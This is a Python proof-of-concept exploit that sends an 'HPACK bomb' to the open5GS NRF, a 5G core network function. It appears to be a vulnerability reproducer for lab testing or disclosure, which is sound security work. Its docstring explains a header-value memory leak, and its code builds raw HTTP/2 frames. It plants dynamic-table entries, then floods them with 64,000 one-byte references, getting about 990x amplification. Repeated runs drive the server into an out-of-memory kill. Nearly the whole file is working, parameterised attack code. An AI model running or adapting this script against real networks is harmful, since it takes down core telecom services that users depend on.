#!/usr/bin/env python3
"""
hpack_bomb.py -- minimal HPACK-bomb reproducer for the open5GS NRF.

open5GS hands every decoded header field to ogs_sbi_header_set()
(lib/sbi/message.h), which strdups the key and the value. When a key repeats,
find_entry() in lib/core/ogs-hash.c returns early so the new key is never
owned, and the replace branch of ogs_hash_set_debug() overwrites the old value
without freeing it. Neither string is ever released -- a permanent leak
(CWE-401) that nothing bounds, because open5GS advertises no
SETTINGS_MAX_HEADER_LIST_SIZE and enforces no limit on field count or on the
decoded header list.

HPACK removes the practical bound on field count. Each run is two requests:

  fill   a GET carrying 4 literal-with-incremental-indexing headers (0x40) of
         950 B each, which plants 4 entries in the server's dynamic table.
         ~3.9 KB, one HEADERS frame.
  bomb   a GET carrying 64000 one-byte indexed references (0x80|62..65) to
         those entries: 64059 B on the wire, sent as 1 HEADERS + 3
         CONTINUATION, decoding to 63.36 MB of header list -- ~990x
         amplification -- and retaining ~72.4 MiB of heap.

Both stay inside the 65536 B per-field value cap that libnghttp2 enforces --
each planted value is 950 B. Nothing bounds the field count or the size of the
decoded header list, and that is the whole attack: --bomb-refs 10000 fits in a
single HEADERS frame with no CONTINUATION at all and still leaks. The server
answers 200 either way.

Repeat against a capped container and the kernel OOM-killer takes the process:
from a ~273 MiB baseline under a 1 GiB cap, that is request 11.

Usage:
  docker update --memory 1g --memory-swap 1g nrf
  python3 hpack_bomb.py --repeat 20 2>&1 | tee ../logs/nrf_oom_kill.log

The tool reads no file and writes no file. stdout is the whole record -- every
frame put on the wire, every frame received, and the container RSS before and
after each request -- so capture it with `tee`.

Exit codes: 0 = ran, 2 = endpoint unreachable, 3 = aborted mid-test.
"""
import argparse
import select
import socket
import subprocess
import sys
import time

import hpack
from hyperframe.frame import (
    HeadersFrame, ContinuationFrame, SettingsFrame, DataFrame,
    GoAwayFrame, RstStreamFrame,
)

PREFACE = b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'
MAX_FRAME = 16384        # RFC 7540 default; open5GS advertises no other value
TIMEOUT = 10.0           # connect and handshake timeout
FILL_K = 4               # entries planted in the server's dynamic table
FILL_VALUE = 950         # bytes per planted value
DYN_BASE = 62            # first dynamic-table index, after the static table

FRAMES = {0: DataFrame, 1: HeadersFrame, 3: RstStreamFrame, 4: SettingsFrame,
          7: GoAwayFrame, 9: ContinuationFrame}
ERR = {0: 'NO_ERROR', 1: 'PROTOCOL_ERROR', 2: 'INTERNAL_ERROR',
       3: 'FLOW_CONTROL_ERROR', 5: 'STREAM_CLOSED', 6: 'FRAME_SIZE_ERROR',
       7: 'REFUSED_STREAM', 8: 'CANCEL', 9: 'COMPRESSION_ERROR',
       11: 'ENHANCE_YOUR_CALM'}
SETTINGS = {1: 'HEADER_TABLE_SIZE', 2: 'ENABLE_PUSH',
            3: 'MAX_CONCURRENT_STREAMS', 4: 'INITIAL_WINDOW_SIZE',
            5: 'MAX_FRAME_SIZE', 6: 'MAX_HEADER_LIST_SIZE'}

def log(msg):
    print(f"[{time.strftime('%H:%M:%S')}] {msg}", flush=True)


# ------------------------------------------------------- HPACK (RFC 7541) ---
def hpack_int(value, prefix_bits, first_byte):
    """5.1 integer encoding into a prefixed byte sequence."""
    maxp = (1 << prefix_bits) - 1
    if value < maxp:
        return bytes([first_byte | value])
    out = bytearray([first_byte | maxp])
    value -= maxp
    while value >= 128:
        out.append(value % 128 + 128)
        value //= 128
    out.append(value)
    return bytes(out)


def lit_str(s, prefix_bits=7, first_byte=0x00):
    b = s.encode() if isinstance(s, str) else s
    return hpack_int(len(b), prefix_bits, first_byte) + b


def indexed(idx):
    """Indexed header field -- one byte for idx <= 126. This is the bomb."""
    return hpack_int(idx, 7, 0x80)


def lit_noindex(idx, value):
    """Literal without indexing, name from the static table (0000 NNNN)."""
    return bytes([idx]) + lit_str(value)


def lit_incr_newname(name, value):
    """Literal WITH incremental indexing, new name (0100 0000): inserts an
    entry into the *server's* dynamic table. This is how the bomb is planted."""
    return bytes([0x40]) + lit_str(name) + lit_str(value)


def pseudo_block(path, authority, extra=b''):
    """:method GET (2) and :scheme http (6) from the static table; :path (4)
    and :authority (1) as literal-without-indexing so they do not displace the
    planted entries. Order per RFC 7540 8.1.2.3."""
    return (indexed(2) + indexed(6) + lit_noindex(4, path)
            + lit_noindex(1, authority) + extra)


# ------------------------------------------------------------ connection ----
class H2Conn:
    """Minimal h2c prior-knowledge client: handshake, fragment a header block,
    read one response."""

    def __init__(self, host, port):
        self.host, self.port = host, port
        self.sock = socket.create_connection((host, port), timeout=TIMEOUT)
        self.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        self.buf = b''
        self.closed = False
        self.settings = {}
        self.max_frame = MAX_FRAME
        self.next_stream = 1
        self.decoder = None

    def stream_id(self):
        sid = self.next_stream
        self.next_stream += 2
        return sid

    def send_frame(self, f):
        raw = f.serialize()
        self.sock.sendall(raw)
        log(f"SENT {type(f).__name__} stream={f.stream_id} "
            f"len={len(raw) - 9} flags={sorted(f.flags)}")

    def handshake(self):
        s = SettingsFrame(stream_id=0)
        s.settings = {}
        self.sock.sendall(PREFACE + s.serialize())
        deadline = time.time() + TIMEOUT
        while time.time() < deadline and not self.closed:
            for f in self.poll(0.5):
                if isinstance(f, SettingsFrame) and 'ACK' not in f.flags:
                    self.settings = dict(f.settings)
                    ack = SettingsFrame(stream_id=0)
                    ack.flags.add('ACK')
                    self.sock.sendall(ack.serialize())
                    names = {SETTINGS.get(k, k): v
                             for k, v in self.settings.items()}
                    log(f"server SETTINGS: {names}")
                    if self.settings.get(5):
                        self.max_frame = min(self.settings[5], 1 << 24)
                    return
        raise RuntimeError("no server SETTINGS: endpoint is not HTTP/2")

    def poll(self, wait):
        """Yield every frame currently readable, waiting up to `wait` seconds."""
        end = time.time() + wait
        while True:
            while len(self.buf) >= 9:
                length = int.from_bytes(self.buf[:3], 'big')
                if len(self.buf) < 9 + length:
                    break
                ftype, hdr = self.buf[3], self.buf[:9]
                body = self.buf[9:9 + length]
                self.buf = self.buf[9 + length:]
                cls = FRAMES.get(ftype)
                if cls is None:
                    log(f"RECV frame type={ftype} len={length} "
                        f"flags=0x{hdr[4]:02x}")
                    continue
                f, _ = cls.parse_frame_header(memoryview(hdr))
                f.parse_body(memoryview(body))
                self.describe(f)
                yield f
            remain = end - time.time()
            if remain <= 0:
                return
            if not select.select([self.sock], [], [], remain)[0]:
                return
            try:
                chunk = self.sock.recv(65536)
            except OSError:
                chunk = b''
            if not chunk:
                self.closed = True
                log("RECV <connection closed by peer>")
                return
            self.buf += chunk

    def describe(self, f):
        if isinstance(f, GoAwayFrame):
            log(f"RECV GOAWAY last_stream={f.last_stream_id} "
                f"error={ERR.get(f.error_code, f.error_code)} "
                f"debug={f.additional_data[:64]!r}")
        elif isinstance(f, RstStreamFrame):
            log(f"RECV RST_STREAM stream={f.stream_id} "
                f"error={ERR.get(f.error_code, f.error_code)}")
        elif isinstance(f, SettingsFrame):
            log("RECV SETTINGS(ACK)" if 'ACK' in f.flags
                else f"RECV SETTINGS {f.settings}")
        elif isinstance(f, HeadersFrame):
            log(f"RECV HEADERS stream={f.stream_id} len={len(f.data)} "
                f"flags={sorted(f.flags)}")
        elif isinstance(f, DataFrame):
            log(f"RECV DATA stream={f.stream_id} len={len(f.data)}")
        elif isinstance(f, ContinuationFrame):
            log(f"RECV CONTINUATION stream={f.stream_id} len={len(f.data)}")

    def send_block(self, sid, block):
        """Fragment a header block over HEADERS + CONTINUATION at the server's
        MAX_FRAME_SIZE. Returns the number of header-block frames sent.

        RFC 7540 6.10: a CONTINUATION may carry only END_HEADERS, and
        END_STREAM must stay on the HEADERS frame, so a fragmented block is
        closed afterwards with a zero-length DATA frame. That DATA frame is not
        part of the header block and is not counted in the return value.
        """
        chunks = [block[i:i + self.max_frame]
                  for i in range(0, len(block), self.max_frame)] or [b'']
        f = HeadersFrame(stream_id=sid)
        f.data = chunks[0]
        if len(chunks) == 1:
            f.flags.add('END_HEADERS')
            f.flags.add('END_STREAM')
        self.send_frame(f)
        for i, ch in enumerate(chunks[1:], start=1):
            c = ContinuationFrame(stream_id=sid)
            c.data = ch
            if i == len(chunks) - 1:
                c.flags.add('END_HEADERS')
            self.send_frame(c)
        if len(chunks) > 1:
            d = DataFrame(stream_id=sid)
            d.data = b''
            d.flags.add('END_STREAM')
            self.send_frame(d)
        return len(chunks)

    def close(self):
        try:
            self.sock.close()
        except OSError:
            pass


# ----------------------------------------------------------------- helpers --
def watch(conn, sid, seconds):
    """Read frames until the stream ends, or GOAWAY / RST / close arrives.
    Returns only what the caller acts on. The frames themselves are already on
    stdout via describe(), so nothing is accumulated here."""
    res = {'status': None, 'goaway': None, 'rst': None, 'closed': False}
    t0 = time.time()
    end = t0 + seconds
    done = False
    while time.time() < end and not done:
        for f in conn.poll(min(0.5, max(end - time.time(), 0.01))):
            if isinstance(f, GoAwayFrame):
                res['goaway'] = ERR.get(f.error_code, f.error_code)
                done = True
            elif isinstance(f, RstStreamFrame) and f.stream_id == sid:
                res['rst'] = ERR.get(f.error_code, f.error_code)
                done = True
            elif isinstance(f, HeadersFrame) and f.stream_id == sid:
                try:
                    if conn.decoder is None:
                        conn.decoder = hpack.Decoder()
                    fields = conn.decoder.decode(f.data, raw=True)
                    res['status'] = next(
                        (v.decode() for k, v in fields
                         if k.decode() == ':status'), None)
                except Exception as e:                     # noqa: BLE001
                    log(f"    could not decode the response headers: {e}")
                if 'END_STREAM' in f.flags:
                    done = True
            elif isinstance(f, DataFrame) and f.stream_id == sid:
                if 'END_STREAM' in f.flags:
                    done = True
        if conn.closed:
            res['closed'] = True
            break
    log(f"    result: status={res['status']} goaway={res['goaway']} "
        f"rst={res['rst']} closed={res['closed']} "
        f"elapsed={round(time.time() - t0, 3)}s")
    return res


def docker_stats(container):
    try:
        return subprocess.run(
            ['docker', 'stats', '--no-stream', '--format',
             '{{.MemUsage}} {{.CPUPerc}}', container],
            capture_output=True, text=True, timeout=15).stdout.strip()
    except Exception as e:                                 # noqa: BLE001
        return f"stats error: {e}"


# -------------------------------------------------------------------- bomb --
def hpack_bomb(conn, path, refs, wait):
    """Two requests on one connection: plant the entries, then reference them."""
    entry = len(f'x-bomb-{FILL_K - 1}') + FILL_VALUE + 32   # RFC 7541 4.1
    if FILL_K * entry > 4096:
        raise ValueError(
            f'{FILL_K} planted entries of {entry}B exceed the 4096B default '
            f'dynamic table; the oldest would be evicted and the bomb would '
            f'under-deliver')
    authority = f'{conn.host}:{conn.port}'

    # 1. fill -- literal WITH incremental indexing inserts server-side
    fill = b''.join(lit_incr_newname(f'x-bomb-{i}', 'B' * FILL_VALUE)
                    for i in range(FILL_K))
    sid = conn.stream_id()
    conn.send_block(sid, pseudo_block(path, authority, fill))
    log(f"--- fill: {FILL_K} entries x {FILL_VALUE}B planted "
        f"({FILL_K * entry}B of the 4096B dynamic table)")
    if watch(conn, sid, wait)['goaway'] or conn.closed:
        log("    connection lost during the fill phase; not sending the bomb")
        return

    # 2. bomb -- one byte per field, all pointing at the planted entries
    block = pseudo_block(path, authority,
                         b''.join(indexed(DYN_BASE + i % FILL_K)
                                  for i in range(refs)))
    sid = conn.stream_id()
    frames = conn.send_block(sid, block)
    log(f"--- bomb: {len(block)}B wire -> {frames} frames "
        f"({frames - 1} CONTINUATION) -> decoded ~{refs * entry / 1e6:.2f}MB, "
        f"amplification ~{refs * entry // len(block)}x")
    watch(conn, sid, wait)


# -------------------------------------------------------------------- main --
def main():
    p = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument('--host', default='172.22.0.12',
                   help='NRF SBI address (default: %(default)s)')
    p.add_argument('--port', type=int, default=7777,
                   help='NRF SBI port (default: %(default)s)')
    p.add_argument('--tests', default='hpackbomb', choices=['hpackbomb'],
                   help='accepted so existing command lines keep working; the '
                        'bomb is the only test this tool performs')
    p.add_argument('--bomb-path',
                   default='/nnrf-nfm/v1/nf-instances?nf-type=AMF',
                   help='request path for both the fill and the bomb '
                        '(default: the NRF discovery URI)')
    p.add_argument('--bomb-refs', type=int, default=64000,
                   help='one-byte indexed refs in the bomb block '
                        '(default: %(default)s)')
    p.add_argument('--wait', type=float, default=15.0,
                   help='seconds to wait for each response '
                        '(default: %(default)s)')
    p.add_argument('--repeat', type=int, default=1,
                   help='runs, each on a fresh connection. Every bomb retains '
                        '~72.4 MiB, so under a 1 GiB cap the NRF dies on '
                        'request 11 -- use 20 for the OOM-kill proof '
                        '(default: %(default)s)')
    p.add_argument('--stats-container', default='nrf',
                   help='container to sample RSS from; the delta is the leak '
                        'evidence (default: %(default)s)')
    args = p.parse_args()

    exit_code = 0
    for i in range(args.repeat):
        log(f"===== RUN {i + 1}/{args.repeat} "
            f"http2://{args.host}:{args.port}{args.bomb_path} "
            f"refs={args.bomb_refs} =====")
        log(f"stats(before): {docker_stats(args.stats_container)}")
        conn = None
        try:
            conn = H2Conn(args.host, args.port)
            conn.handshake()
            try:
                hpack_bomb(conn, args.bomb_path, args.bomb_refs, args.wait)
            except OSError as e:
                log(f"    connection lost during the bomb: "
                    f"{type(e).__name__}: {e}")
        except (ConnectionRefusedError, socket.timeout, TimeoutError) as e:
            log(f"FATAL: connect/handshake failed: {e}")
            exit_code = 2
        except Exception as e:                             # noqa: BLE001
            log(f"FATAL: {type(e).__name__}: {e}")
            exit_code = 3
        finally:
            if conn:
                conn.close()
            time.sleep(1.0)
            log(f"stats(after): {docker_stats(args.stats_container)}")
        if exit_code == 2:
            break

    sys.exit(exit_code)


if __name__ == '__main__':
    main()
